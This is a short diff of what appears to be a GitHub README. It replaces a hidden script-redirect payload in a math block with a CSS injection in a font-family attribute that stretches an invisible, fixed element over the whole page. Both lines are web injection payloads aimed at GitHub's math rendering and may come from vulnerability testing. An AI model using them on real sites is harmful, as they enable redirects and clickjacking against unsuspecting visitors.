@@ -3,7 +3,7 @@
 <p align="center"> <a >✨ I <3 Github ✨</a> </p>
 
 ```math
-$$\ms[style='display:none;']{<script>window.location='https://example.com';</script>}$$
+$$\ms[fontfamily="goombafont; color:red; z-index: 100000; position: fixed; top: 0; left: 0; height: 100vh; object-fit: cover; background-size: cover; width: 130vw; opacity: 0;"]{}$$
 
 
 
